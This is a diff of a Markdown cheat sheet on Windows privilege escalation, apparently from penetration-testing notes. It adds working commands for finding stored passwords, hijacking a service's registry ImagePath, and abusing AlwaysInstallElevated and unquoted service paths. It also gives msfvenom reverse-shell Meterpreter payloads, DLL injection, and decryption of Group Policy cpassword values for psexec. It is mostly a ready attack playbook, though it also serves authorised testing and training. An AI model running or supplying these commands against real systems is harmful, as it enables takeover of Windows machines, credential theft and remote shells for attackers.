@@ -188,7 +188,10 @@ net localgroup administrators /add <username>
 For files where passwords might be, look out for the files being base64 encoded.
 ### General Search
 ```cmd
-# General Search 
+# find the keyword "password" in all files
+findstr /spin "password" *.*
+
+# General Search w/ File Extension
 findstr /si password *.txt
 findstr /si password *.xml
 findstr /si password *.ini
@@ -204,12 +207,7 @@ findstr /spin "password" *.*
 *Note: For files where passwords might be, look out for the files being base64 encoded.*
 
 ```cmd
-c:\sysprep.inf
-c:\sysprep\sysprep.xml
-c:\unattend.xml
-%WINDIR%\Panther\Unattend\Unattended.xml
-%WINDIR%\Panther\Unattended.xml
-
+# Find Location
 dir c:\*vnc.ini /s /b
 dir c:\*ultravnc.ini /s /b 
 dir c:\ /s /b | findstr /si *vnc.ini
@@ -219,6 +217,12 @@ dir /b /s sysprep.inf
 dir /b /s sysprep.xml
 dir /b /s *pass*
 dir /b /s vnc.ini
+
+c:\sysprep.inf
+c:\sysprep\sysprep.xml
+c:\unattend.xml
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
 ```
 
 ### In Registry
@@ -240,16 +244,47 @@ reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
 
-## Access Control
+## Access Control and Insecure Permissions
 ### Weak Services
 ```cmd
 wmic service list brief
+```
+
+### Insecure Registry Permissions
+```cmd
+# Find writeable registry keys for services using Accesschk
+accesschk hostname\username -kwsuwq hklm\system\currentcontrolset\services
+accesschk Everyone -kwsuwq hklm\system\currentcontrolset\services
+accesschk "Authenticated Users" -kwsuwq hklm\system\currentcontrolset\services
+accesschk Users -kwsuwq hklm\system\currentcontrolset\services
+
+# check query value
+reg query HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath
+
+# change image path
+reg add HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath /d "C:\temp\evil.exe"
+
+# or use following command (/t: type, /v:value or name of entry, /f: add without prompting for confirmation, /d: data)
+reg add HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /t REG_EXPAND_SZ /v ImagePath /d "C:\temp\evil.exe" /f
+
+# restart the service and the custom payload will be executed instead of the service binary and it will 
+# return back a Meterpreter session as SYSTEM.
+sc start SomeSoftwareName
 ```
 
 ### AlwaysInstalledElevated
 ```cmd
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+
+# To Exploit
+# Generate Payload
+msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi
+
+# Place 'setup.msi' in 'C:\Temp'
+# Execute
+msiexec /quiet /qn /i C:\Temp\setup.msi
+net localgroup Administrators
 ```
 
 ### Insecure Service Permissions
@@ -278,11 +313,63 @@ net start upnphost
 # listen on port 9988 and you'll get a shell with NT AUTHORITY\SYSTEM privilege
 ```
 
-## Exploiting
+### Unquoted Service Paths
 ```cmd
-# Exploiting AlwaysInstalledElevated
-msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi
-Place 'setup.msi' in 'C:\Temp'
-msiexec /quiet /qn /i C:\Temp\setup.msi
-net localgroup Administrators
+# find the affected paths manually
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+
+eg: 
+C:\Program Files\somepath\example.exe is affected
+cd C:\Program Files\somepath\
+icacls example.exe
+
+# Check if you can write on this directory (see Everyone:(CI) (F) which means write permission for everyone)
+# Create a payload (one of them given below can be used)
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe > example.exe
+
+# Upload the malicious exe and replace as the original one
+# Use exploit/multi/handler and get an admin shell on metasploit
+
+eg2:
+# or you can do the same steps by adding an admin user by creating the following executable 
+msfvenom -p windows/exec CMD='net localgroup administrators <username here> /add' -f exe > example.exe
+```
+
+## Exploiting
+### DLL Injection
+```cmd
+# Create the DLL malicious file
+msfvenom -p windows\meterpreter\reverse_tcp LHOST=<ip> LPORT=<port> -f dll > evil.dll
+
+# set up exploit/multi/handler on metasploit
+
+# Using the tool Remote DLL Injector from SecurityXploded (use command tasklist to check process ids)
+RemoteDLLInjector64.exe <process id> C:\path\to\evil.dll
+
+# Other DLL Injects on GitHub
+```
+### Group Policy
+```cmd
+# check for ip address of domain controller
+nslookup nameofserver.whatever.local
+
+# now mount it
+net use z: \\<DC IP address>\SYSVOL
+
+# go to z: drive
+z:
+
+# search for Groups.xml files
+dir Groups.xml /s
+
+# search for all .xml files for keyword "cpassword"
+findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
+
+# decrypt the password found
+gpp-decrypt <pass>
+
+# Metasploit module
+post/windows/gather/credentials/gpp
+# after credentials are found, use Psexec module
+exploit/windows/smb/psexec
 ```
